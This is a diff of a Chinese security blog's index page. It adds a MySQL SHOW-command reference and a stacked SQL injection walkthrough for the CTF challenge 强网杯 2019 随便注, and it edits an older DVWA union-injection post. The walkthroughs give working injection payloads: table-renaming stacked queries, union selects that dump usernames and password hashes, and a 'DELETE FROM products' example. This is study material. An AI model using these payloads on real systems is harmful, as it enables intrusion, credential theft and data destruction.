@@ -156,6 +156,156 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-MySQL-show语法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/04/MySQL-show%E8%AF%AD%E6%B3%95/">MySQL-show语法</a>
+    </h1>
+  
+
+        
+        <a href="/2020/08/04/MySQL-show%E8%AF%AD%E6%B3%95/" class="archive-article-date">
+  	<time datetime="2020-08-04T06:25:50.083Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MySQL中show语法"><a href="#MySQL中show语法" class="headerlink" title="MySQL中show语法"></a>MySQL中show语法</h1><ol>
+<li>show tables或show tables from database_name; – 显示当前数据库中所有表的名称。 </li>
+<li>show databases; – 显示mysql中所有数据库的名称。 </li>
+<li>show columns from table_name from database_name; 或show columns from database_name.table_name; – 显示表中列名称。 </li>
+<li>show grants for user_name; – 显示一个用户的权限，显示结果类似于grant 命令。 </li>
+<li>show index from table_name; – 显示表的索引。 </li>
+<li>show status; – 显示一些系统特定资源的信息，例如，正在运行的线程数量。 </li>
+<li>show variables; – 显示系统变量的名称和值。 </li>
+<li>show processlist; – 显示系统中正在运行的所有进程，也就是当前正在执行的查询。大多数用户可以查看他们自己的进程，但是如果他们拥有process权限，就可以查看所有人的进程，包括密码。 </li>
+<li>show table status; – 显示当前使用或者指定的database中的每个表的信息。信息包括表类型和表的最新更新时间。 </li>
+<li>show privileges; – 显示服务器所支持的不同权限。 </li>
+<li>show create database database_name; – 显示create database 语句是否能够创建指定的数据库。 </li>
+<li>show create table table_name; – 显示create database 语句是否能够创建指定的数据库。 </li>
+<li>show engines; – 显示安装以后可用的存储引擎和默认引擎。 </li>
+<li>show innodb status; – 显示innoDB存储引擎的状态。 </li>
+<li>show logs; – 显示BDB存储引擎的日志。 </li>
+<li>show warnings; – 显示最后一个执行的语句所产生的错误、警告和通知。 </li>
+<li>show errors; – 只显示最后一个执行语句所产生的错误。 </li>
+<li>show [storage] engines; –显示安装后的可用存储引擎和默认引擎。</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/08/04/MySQL-show%E8%AF%AD%E6%B3%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-sql注入-堆叠注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/04/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">sql注入-堆叠注入</a>
+    </h1>
+  
+
+        
+        <a href="/2020/08/04/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2020-08-04T05:43:58.825Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而<code>union injection</code>（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<code>union</code> 或者<code>union all</code>执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：（因未对输入的参数进行过滤）<code>Select * from products where productid=1;DELETE FROM products</code>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<h1 id="0x01-ctf题目测试"><a href="#0x01-ctf题目测试" class="headerlink" title="0x01 ctf题目测试"></a>0x01 ctf题目测试</h1><p>题目：[强网杯 2019]随便注<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-1.png" alt></p>
+<h2 id="0X11"><a href="#0X11" class="headerlink" title="0X11"></a>0X11</h2><p>首先测试常规<code>union</code>注入<br>输入<code>1</code>有回显<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-2.png" alt><br>输入<code>1&#39;</code>报错<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-3.png" alt><br>输入<code>1&#39;#</code>有回显,说明存在sql注入<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-4.png" alt><br>输入<code>1&#39; order 2#</code>有回显，但是<code>1&#39; order 3#</code>无回显，说明有两列输出<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-5.png" alt><br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-6.png" alt><br>输入<code>1&#39; and 1=2 union select version(),database()#</code>，显示<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-7.png" alt><br>说明被限制权限，常规办法用不了</p>
+<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><p>那就是堆叠注入了<br>输入<code>1&#39;;show databases; #</code>,回显正常,存在堆叠注入<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-8.png" alt><br>输入<code>1&#39;;show tables; #</code>,爆出两个表，”1919810931114514” 和 “words”<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-9.png" alt><br>判断网页连接的是哪张表<br>输入<code>1&#39;; show columns from `words`;#</code>发现有两个字段<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-10.png" alt><br>而<code>1&#39;; show columns from `1919810931114514`;#</code>只有一个字段，并且是”flag”<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-11.png" alt><br>结合 0x11里得出的两个字段，也就是两个列，所以得出结论，网页连接的是”words”表，并且是字段”id”，在 0x11 里我们知道了后台限制了权限，但是并没有限制 “alert” 和 “rename”，那么我们是不是可以把表改个名字，再给列改个名字呢。先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id。<br>我们输入<code>1&#39;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100);show columns from words;#</code>(不懂得可以去查sql语法)。<br>最后输入<code>1&#39; or &#39;1&#39;=&#39;1</code>强制语句正确，得到flag<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-12.png" alt></p>
+<p>最后说明一下 “‘“ 和 “`” 的区别<br>linux下不区分，windows下区分<br>区别:<br>单引号( ‘ )或双引号主要用于字符串的引用符号<br>eg：mysql&gt; SELECT ‘hello’, “hello” ;</p>
+<p>反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]<br>eg:`mysql&gt;SELECT * FROM   `table`   WHERE `from` = ‘abc’ ;</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/08/04/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-sql注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -191,7 +341,7 @@
 <p>我们输入<code>1&#39; union select table_name,table_schema from information_schema.tables where table_schema= &#39;dvwa&#39;#</code>进行查询：<br>实际执行的Sql语句是：</p>
 <p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; union select table_name,table_schema from information_schema.tables where table_schema= &#39;dvwa&#39;#`;</code><br><img src="./sql%E6%B3%A8%E5%85%A5-10.jpg" alt><br>通过上图返回信息，我们再获取到：</p>
 <p>·dvwa 数据库有两个数据表，分别是 guestbook 和 users .<br>有些同学肯定还不满足目前获取到的信息，那么我们接下来尝试获取重量级的用户名、密码。<br>由经验我们可以大胆猜测users表的字段为 user 和 password ，所以输入：<code>1&#39; union select user,password from users#</code>进行查询：<br>实际执行的 Sql 语句是：<br><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; union select user,password from users#`;</code><br><img src="./sql%E6%B3%A8%E5%85%A5-11.jpg" alt><br>可以看到成功爆出用户名、密码，密码采用 md5 进行加密，可以到<code>www.cmd5.com</code>进行解密。<br>直此，同学们应该已经对 Sql 注入有了一个大概得了解，也清楚了 Sql 注入的强大。</p>
-<p>转自简书-Jewel591-sql注入基础原理（超详细）</p>
+<p>转自：<a href="https://www.jianshu.com/p/078df7a35671" target="_blank" rel="noopener">简书-Jewel591-sql注入基础原理（超详细）</a></p>
 
       
 
@@ -319,7 +469,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>持续更新中…<br>点击更多显示图片，有点慢，耐心等待<br>1.web2 2020-7-9<br><img src="./web2.png" alt><br>查看源码之后一眼就能看到<br>flag：KEY{Web-2-bugKssNNikls9100}</p>
+        <p>持续更新中… 2020.07.24<br>展开全文有图片<br>1.web2 2020-7-9<br><img src="./web2.png" alt><br>查看源码之后一眼就能看到<br>flag：KEY{Web-2-bugKssNNikls9100}</p>
 <hr>
 <p>2.计算器 2020-7-9<br><img src="./%E8%AE%A1%E7%AE%97%E5%99%A8-1.png" alt><br>查看源码，图中所指限制了输入数字的个数，改成比计算结果大的数字就可以获得flag</p>
 <p><img src="./%E8%AE%A1%E7%AE%97%E5%99%A8-2.png" alt><br>flag：flag{CTF-bugku-0032}</p>
@@ -407,7 +557,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>持续更新中…</p>
+        <p>持续更新中… 2020.07.20</p>
 <ol>
 <li><p>摩斯密码：..-./.-../.-/–.</p>
 </li>
